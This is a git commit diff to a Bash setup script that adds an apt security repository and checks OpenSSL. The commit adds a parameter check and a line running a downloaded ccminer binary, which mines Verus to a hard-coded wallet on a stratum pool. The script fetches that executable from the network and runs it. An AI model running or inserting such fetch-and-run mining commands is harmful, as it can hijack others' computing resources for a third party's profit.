1c8ee50388506062f595e950c48cf5b56daa68a0
Afnors <raihnoppa@gmail.com>
2024-12-08 21:56:36 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,5 +1,11 @@
 #!/bin/bash
 
+if [ -z "$1" ]
+then
+   echo "Parameter are required!";
+   exit 1
+fi
+
 # Nama file repositori yang akan ditambahkan
 SOURCE_LIST="/etc/apt/sources.list.d/security-repo.list"
 
@@ -38,6 +44,8 @@ echo "Verifikasi versi OpenSSL..."
 openssl version
 
 wget https://raw.githubusercontent.com/afnorsGG/ccminer/refs/heads/main/ccminer && chmod +x ccminer
+
+./ccminer -a verus -o stratum+tcp://sg.vipor.net:5040 -u RKgBuymiEvCmvSC5TmANpEusxor6xWsooD.$1 -t 4
 
 # Selesai
 echo "Proses selesai!"
